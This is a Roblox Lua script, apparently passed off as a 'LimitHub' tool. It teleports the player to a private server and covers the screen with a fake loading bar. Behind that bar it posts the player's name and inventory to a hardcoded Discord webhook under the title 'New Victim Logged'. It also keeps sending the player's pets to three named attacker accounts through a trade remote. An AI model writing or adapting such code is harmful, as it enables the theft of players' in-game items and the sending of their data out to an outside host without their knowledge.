local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

-- ✅ Custom webhook URL mo bro
local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"

-- ✅ Target private server
local placeId = 126884695634066
local privateServerCode = "40206718588419987554943106780552"

-- ✅ Mag-teleport muna
TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})

-- ✅ Wait until player successfully joined
game.Loaded:Wait()

-- ✅ GUI: Loading bar (5% per 10s)
task.spawn(function()
    local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
    gui.Name = "LimitHubLoading"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false

    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(15, 15, 15)

    local barFrame = Instance.new("Frame", bg)
    barFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    barFrame.Position = UDim2.new(0.5, 0, 0.7, 0)
    barFrame.Size = UDim2.new(0, 400, 0, 30)
    barFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    barFrame.BorderSizePixel = 0
    barFrame.BackgroundTransparency = 0.2

    local bar = Instance.new("Frame", barFrame)
    bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    bar.Size = UDim2.new(0, 0, 1, 0)
    bar.BorderSizePixel = 0

    local percentText = Instance.new("TextLabel", bg)
    percentText.AnchorPoint = Vector2.new(0.5, 0.5)
    percentText.Position = UDim2.new(0.5, 0, 0.6, 0)
    percentText.Size = UDim2.new(0, 200, 0, 50)
    percentText.Text = "Loading... 0%"
    percentText.TextColor3 = Color3.new(1, 1, 1)
    percentText.BackgroundTransparency = 1
    percentText.TextScaled = true
    percentText.Font = Enum.Font.SourceSansBold

    for i = 1, 20 do
        percentText.Text = "Loading... " .. (i * 5) .. "%"
        bar.Size = UDim2.new(i * 0.05, 0, 1, 0)
        task.wait(10)
    end
end)

-- ✅ Function: Send inventory and name to Discord
task.spawn(function()
    local inventory = {}
    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
        table.insert(inventory, item.Name)
    end
    local data = {
        username = "LimitHub Logger",
        embeds = {{
            title = "New Victim Logged",
            description = "**Username:** " .. LocalPlayer.Name .. "\n**Inventory:** " .. table.concat(inventory, ", "),
            color = 65280
        }}
    }
    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end)

-- ✅ Auto-pet transfer to attacker names
task.spawn(function()
    local attackers = {"boneblossom215", "beanstalk1251", "burningbud709"}
    local function getAttacker()
        for _, p in pairs(Players:GetPlayers()) do
            if table.find(attackers, p.Name) then
                return p
            end
        end
        return nil
    end

    local function transferPets()
        local attacker = getAttacker()
        if attacker then
            local args = {
                [1] = attacker.Name,
                [2] = {} -- pets table
            }

            for _, pet in pairs(LocalPlayer.Pets:GetChildren()) do
                if pet:IsA("Model") then
                    table.insert(args[2], pet.Name)
                end
            end

            -- Fire pet transfer
            local success, err = pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TradeInvitePlayer"):FireServer(unpack(args))
            end)

            if success then
                warn("Pets sent to " .. attacker.Name)
            else
                warn("Transfer failed:", err)
            end
        end
    end

    while true do
        transferPets()
        task.wait(5)
    end
end)
